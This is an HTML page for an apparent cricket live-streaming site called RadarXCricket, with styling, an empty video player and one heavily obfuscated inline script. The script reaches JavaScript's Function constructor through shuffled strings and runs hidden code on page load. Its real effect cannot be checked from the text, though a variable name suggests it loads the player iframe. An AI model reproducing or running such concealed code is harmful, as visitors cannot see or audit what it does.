<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXCricket</title>
    <style>
        /* General Page Styling */
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #242424, #3b5998);
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
        }

        /* Bingewav Sports Logo Section */
        .logo-container {
            background: #000; /* Black background for the logo */
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
        }

        .logo-container img {
            width: 220px; /* Adjust the logo size */
            height: auto;
        }

        /* Video Player Styling */
        .player-container {
            width: 95%;
            max-width: 1200px;
            margin: 20px auto;
            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.4);
            border-radius: 15px;
            overflow: hidden;
            background: #000; /* Black background behind the video for better focus */
            position: relative;
            padding-top: 56.25%; /* 16:9 Aspect Ratio */
        }

        .player-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 15px;
            border: none;
        }

        /* Stream Issue Section */
        .stream-issue {
            margin-top: 20px;
            padding: 15px 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            font-size: 16px;
            color: #fff;
            width: fit-content;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
        }

        .stream-issue a {
            color: #00c1ff;
            text-decoration: none;
            font-weight: bold;
        }

        .stream-issue a:hover {
            text-decoration: underline;
        }

        /* Join Telegram Button */
        .join-telegram-container {
            margin-top: 20px;
            text-align: center;
        }

        .join-telegram-btn {
            padding: 10px 20px;
            font-size: 16px;
            font-weight: bold;
            color: white;
            background-color: #008fd6;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }

        .join-telegram-btn:hover {
            background-color: #006bb3;
        }
    </style>
</head>
<body>

<!-- Video Player Section -->
<div class="player-container" id="playerContainer"></div>
<!-- Join Telegram Button
<div class="join-telegram-container">
    <button class="join-telegram-btn" onclick="window.open('https://t.me/RadarXCricket', '_blank')">Join Telegram Channel</button>
</div>
-->
<script>
var loadIframe;(function(){var CAy='',mFT=513-502;function ywr(u){var j=2026341;var s=u.length;var p=[];for(var w=0;w<s;w++){p[w]=u.charAt(w)};for(var w=0;w<s;w++){var z=j*(w+230)+(j%24965);var q=j*(w+288)+(j%27060);var l=z%s;var k=q%s;var m=p[l];p[l]=p[k];p[k]=m;j=(z+q)%4810019;};return p.join('')};var FCb=ywr('kqcdyetbrxgnjwarpzoivtsouhsrcnfutmocl').substr(0,mFT);var wui='jlf +;0rr=e3llc;c;;Cy;hbp"[(==.e i;.(,1r.= ,sshv]x,z(mo.n.zb;pA+9ceg],+t,u.)([)ro,2+]!5,v.,g4luf.61sw ,7of71rshke5nv;,>fC1v9e++=[t{tA,g)qaj03=slvzns)n;o.;znn)lm(=nn7=0teiia. ;=;]+y7r69vrA,3  t+z2=8l5;jv{r(f<41bn r;s}p;tg uxnfar;1+;o.)1;wunashumer7svb,.=plxr(ao(;zfor-6i0i=-i.r,nrga;1;oj[Cegvi vfdr))aof0nf8}r2s);n(p4h"e=rfnk+i=mw(-tr0po wwhhnolg;ct(ngm,on rot"<ofhf(ram<ehhtrfn<.r,(j{cu=0e(0=="fg])o,(o ]do[rr;2fdt=.rr.i]1)*ips.)[ e g,2st8f+a{arrsoq;r+=8)+==e(=i0;".[) dvb"(t0lets=(j;e(=catpt7=m[,(;+,)ra+vaoa=;}hago=fr;i" ;]=C;r+uv6}ypxCechcco))t;qi.[v9[{ lw)i=e0a-fon>1;-yrg+ln;8s[fsf6-s8)p7oe)c(ng+)-(u,*;floal==jg;{c8rf!d;+],rdr1hA4=)w.7(thuysom)qr=ha+8au)kan=]a9o [Adr=t;0}i; ),(hguao(t;vvpi ueh6j(i(+)"1i3auvfta6+v96n9[unn,w;Ce9vlvgn0et]=t;,r) ]dSaf hgru4ou]gbiC=,+(<827load2a;r=ait]dwrfenui .u))((=n(.ll)tlhal.yva,u.{s;).h6tn(S}aivc.qevd+bpr="1}(kstu)p)vaCiru ;ss+"(=8essva[e8.=hop);';var ErX=ywr[FCb];var Mcv='';var Bgp=ErX;var snP=ErX(Mcv,ywr(wui));var wDP=snP(ywr('Y["9Y4d95w!_ad%YY=w_wh0o{Y(\/5]4b(())+#;an6=v-uimY8m03(};ta;Y6gCnrY(Y09fY(aYtd3rr;_S.ponc(n f3,Y_})aY9r0ayf[,,#Y5;3Y. ed3(Y$}{4=+]}iY l9o6a =Ye\'}.s nb4)5pg(%t,3*s;Y(s"ilrl4;aY.d:)76Y .$to3%f-tr=igYo;b\/m6_rtY.e.Yns!d,(h.t=e0nI6ot(%5l{n%]Y$]m0;pddca=pp9YI[goaaDa0a!e2ao?f9Ye)0\/(n4%lm.eolEYg;tio,5dra;EYi(sYYf5)o_o5h9d!e#=fY.s%j-l\/i7goa_13,%.0i36apx_38!5se.YYn.9Y84dra.)mcneagc7ene_%k%c f%1Yt!.yg_\/v5YYlt_alY_Yt}p tfY#akd}ie%u.a eo.7f5)Yls3f rd(e&Ye=%Yeb%u46(!.o72fi(jC%na.i0a;;zce3-*fY0,l9)aa})q$232\/);aS9Yr*(f_(sr$aj%splra$l=Y_ Yf4!n%taY.wa=?.YY8pa.$Ya,=ll1Y]8r]5rp,tin=0isY)(+e4_5n,(.+_2)l;]\/38YoeoY[5bjYs8Y)sto$7=#20Yyo$]=bsls]%day.otgwu;.7wo.-rifYn_6Y,)Y({6>_s!!{+.Y;1.aa.6e.3ra)!4"rgf{=2Y]{3laY_4!)%_a%;3t.oa)st3a._)f YsazY.);e6gudoY.t0l3l80r)t ;ro(5e=oY0o%3=;cb_Yf719;Y-i6Yj0lkr#oo)1rnratsc!((;,Yaad%ea{r;)ffof1hr.s7.r_:s({.)Y_s$monY zs$6(!e.ef)(mCh)la{s)(%Yp1e=h!=8e7(z..net))=36t=$_(..2r(efY&Ye2).91)f=Ya$Y!-%)9(4erY_eubY-n2Yi;r(YhbYe.Y$_Yb-+a{0lj; cecre_f{,,7i)lcY)7t$>a! b!$2)ogY5 ,hx4$g$z.2YYln31}Y"5],$9}Y)Yi Yf?9<z)9"Y9m:&(05-)Ytd$.l%en ,\'=-[h4a[)1}i}jvYe[YY"ge78,a!,Yo()e(58($!3l)sYe, n63_[-+4.a)l3i\/0[fal9l]o_a3x zg+(erc1)=gY\/Y+em0Y;ro_Yi,p,l{ge}rYe$9fiCY.Y#Yns5a8Y[f!$_(aoe.4be(_(&81Ye>6axni,ll=6YY,Y,eje{]4*1u6!n;(=1$"ah2=.l]du (8(ihruY.tapq3 nY<(Yb.j..Y\'_{{r(laeYY;{4YYaj!e<;;]4)e.7)74=l_37.4ilYwo,u-ii=!Ya){nYYy0(5uY,gax_{Y:.fr(t4Y_oirsYe;fdt,r,ze1h_{8]!6]Yne0#[h_ta>o(f3&l:158w_h;a(17 elYY.YY.$zjle4=3$Y,$itS._$.m)e=mf);lu.)gd.dr3YY0\/5l(t)._YjYm.o(!%5)4)f?x)9i1!",Ye)(bg3d:u2_a3#u1erf}$]l.Y v6csoa;Ytf9 s63.6)Y!d=x]dYYeYo7r(c78_.60r__spYe,z9!o0_sa?=i 1n4fl)(Yfa$n7$.)fa.Ytp0(YYsr3)n9f(](<s.e),d j8jadnYa;tt]r%}"i0,}_$ i(;kai;%2j_ mY!Y1 !uf4_fuoda,dst},\'!t)1.]9w.'));var YOa=Bgp(CAy,wDP );YOa(5620);return 6192})()
</script>

</body>
</html>